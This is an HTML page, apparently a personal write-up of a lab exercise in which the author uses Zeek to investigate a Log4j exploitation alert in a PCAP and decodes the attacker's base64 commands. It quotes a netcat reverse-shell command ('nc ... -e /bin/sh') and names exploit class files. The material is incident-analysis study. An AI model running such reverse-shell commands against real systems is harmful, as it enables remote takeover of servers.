@@ -1,0 +1,143 @@
+<!DOCTYPE HTML>
+<html>
+
+<head>
+  <title>Massively by HTML5 UP</title>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+  <link rel="stylesheet" href="assets/css/main.css" />
+  <noscript>
+    <link rel="stylesheet" href="assets/css/noscript.css" />
+  </noscript>
+</head>
+
+<body class="is-preload">
+
+  <!-- Wrapper -->
+  <div id="wrapper" class="fade-in">
+
+    <!-- Intro -->
+    <div id="intro">
+      <h2>Log4j<br /></h2>
+      <a>Zeek</a></h1>
+      <p>Miguel Nogueira</p>
+      <ul class="actions">
+        <li><a href="#main" class="button icon solid solo fa-arrow-down scrolly">Continue</a></li>
+      </ul>
+    </div>
+
+
+    <div id="copyright">
+      <ul>
+        <li>
+          <h6><a href="index.html">Home Page</h6>
+          </a>
+        </li>
+        <li>
+          <h6><a href="ZeekFolder.html">Previous ‎ ‎ ‎</h6>
+          </a>
+        </li>
+
+      </ul>
+    </div>
+
+
+
+
+
+
+    <!-- Main -->
+    <div id="main">
+
+
+      <!-- Post -->
+      <section class="post"><strong><strong>
+            <h3>An alert triggered: </h3>
+          </strong><small>&quot;Log4J Exploitation Attempt&quot;.</small><br /><small>The case was assigned to you.
+            Inspect
+            the PCAP and retrieve the artefacts to confirm this alert is a true
+            positive. </small><br /><br /><br />First, we
+          will navigate to the directory containing the pcap file.<br /><br /><a href=""><span class="image fit"><img
+                src="images/70-1.png" alt="images/70-1.png" /></a><br /><br />We will examine the
+          &quot;log4shell.pcapng&quot; file using the
+          &quot;detection-log4j.zeek&quot; script.<br />
+          <div class="codebox">
+            <pre>zeek -Cr log4shell.pcapng detection-log4j.zeek</pre>
+          </div><br /><a href=""><span class="image fit"><img src="images/70-2.png"
+                alt="images/70-2.png" /></a><br /><br />Let&#39;s take a
+          look at
+          the table and see that a good stating point might be “signatures.log”<br /><br /><a href=""><span
+              class="image fit"><img src="images/70-3.png" alt="images/70-3.png" /></a><br /><br />
+          <div class="codebox">
+            <pre><span style="color:#ff9d00;font-weight:700">cat</span> signatures.log</pre>
+          </div><br /><a href=""><span class="image fit"><img src="images/70-4.png"
+                alt="images/70-4.png" /></a><br /><br />Now that we have a
+          suspect
+          malicious IP Address, we will investigate “http.log”<br /><br />
+          <div class="codebox">
+            <pre><span style="color:#ff9d00;font-weight:700">cat</span> http.log <span style="color:#ff9d00;font-weight:700">|</span> <span style="color:#ff9d00;font-weight:700">grep</span> 192.168.56.102 <span style="color:#ff9d00;font-weight:700">|</span> <span style="color:#ff9d00;font-weight:700">less</span></pre>
+          </div> <br /><br /><a href=""><span class="image fit"><img src="images/70-5.png"
+                alt="images/70-5.png" /></a><br /><br />We found that
+          the
+          attacker used Nmap (&quot;Network Mapper&quot;) a utility for network discovery and security auditing. Also
+          found
+          the URI of the file. URI is the where inside the page <br /><br /><a href=""><span class="image fit"><img
+                src="images/70-6.png" alt="images/70-6.png" /></a><br /><br />In “log4j.log” we can also search for URI
+          and by sorting it with
+          only
+          unique values, three commands enconded with base64 appear <br /><br /><a href=""><span class="image fit"><img
+                src="images/70-7.png" alt="images/70-7.png" /></a><br /><br />By easily decoding them with “base64
+          --decode” we can acquire that
+          the
+          attacker created a file named pwned in the tmp directory and used Netcat <br /><br /><a href=""><span
+              class="image fit"><img src="images/70-8.png" alt="images/70-8.png" /></a><br /><br />Putting it all
+          together, when you execute
+          the
+          command nc 192.168.56.102 80 -e /bin/sh -vvv, you are attempting to establish a network connection to the
+          specified
+          IP address and port. Once the connection is established, the -e /bin/sh option instructs netcat to initiate a
+          shell
+          session (/bin/sh) on the remote server. This action has the potential to grant remote control over the
+          server.<br /><br />We have identified the malicious IP address&quot;172.17.0.2&quot; and the afected IP
+          Address
+          &quot;192.168.56.102.&quot; Additionally, we have come across exploit files named
+          &quot;/Exploit6HHc3BcVzI.class,&quot; &quot;/ExploitQ8v7ygBW4i.class,&quot; and
+          &quot;/ExploitSMMZvT8GXL.class.&quot; This actor also generated a file named &quot;pwned&quot; in the
+          &quot;/tmp&quot; directory to save the verbose output of the nc command to a file named /tmp/pwned on your
+          local
+          machine (nc &gt; /tmp/pwned).
+    </div>
+
+    <body class="is-preload">
+      <header id="header">
+        <a href="https://yrtree.me/@Miguel%20Nogueira" class="logo">Connect with
+          me</a>
+      </header>
+      <!-- Copyright -->
+      <div id="copyright">
+        <ul>
+          <li>
+            <h6><a href="index.html">Home Page</h6>
+            </a>
+          </li>
+          <li>
+            <h6><a href="ZeekFolder.html">Previous ‎ ‎ ‎</h6>
+            </a>
+          </li>
+
+        </ul>
+      </div>
+  </div>
+
+  <!-- Scripts -->
+  <script src="assets/js/jquery.min.js"></script>
+  <script src="assets/js/jquery.scrollex.min.js"></script>
+  <script src="assets/js/jquery.scrolly.min.js"></script>
+  <script src="assets/js/browser.min.js"></script>
+  <script src="assets/js/breakpoints.min.js"></script>
+  <script src="assets/js/util.js"></script>
+  <script src="assets/js/main.js"></script>
+
+</body>
+
+</html>
